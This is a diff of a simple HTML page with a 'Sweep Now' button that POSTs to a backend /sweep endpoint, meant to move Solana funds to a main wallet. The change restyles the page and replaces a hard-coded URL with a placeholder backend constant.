@@ -4,25 +4,25 @@
 <head>
   <title>Sweep All SOL to Main Wallet (Backend Wallet Pays Gas)</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #000; color: #fff; text-align: center; padding-top: 60px; }
-    button { padding: 10px 20px; font-size: 16px; margin-top: 20px; }
-    #status { margin-top: 30px; font-size: 18px; color: #f88; }
+    body { background-color: black; color: white; text-align: center; font-family: Arial; }
+    button { font-size: 16px; margin: 10px; padding: 10px; }
+    #status { color: red; margin-top: 20px; }
   </style>
 </head>
 <body>
   <h2>Sweep All SOL to Main Wallet (Backend Wallet Pays Gas)</h2>
   <button onclick="sweep()">Sweep Now</button>
   <div id="status"></div>
-
   <script>
+    const BACKEND_URL = "https://your-backend-url.onrender.com"; // Replace after backend deployed
     async function sweep() {
-      document.getElementById('status').innerText = 'Sweeping...';
+      document.getElementById("status").innerText = "Sweeping...";
       try {
-        const res = await fetch('https://amole-nine.vercel.app/sweep', { method: 'POST' });
-        const data = await res.text();
-        document.getElementById('status').innerText = 'Response: ' + data;
+        const res = await fetch(`${BACKEND_URL}/sweep`, { method: "POST" });
+        const text = await res.text();
+        document.getElementById("status").innerText = text.includes("success") ? "Sweep Success!" : "Sweep Failed: " + text;
       } catch (e) {
-        document.getElementById('status').innerText = 'Sweep Failed: ' + e.message;
+        document.getElementById("status").innerText = "Sweep Failed: " + e.message;
       }
     }
   </script>
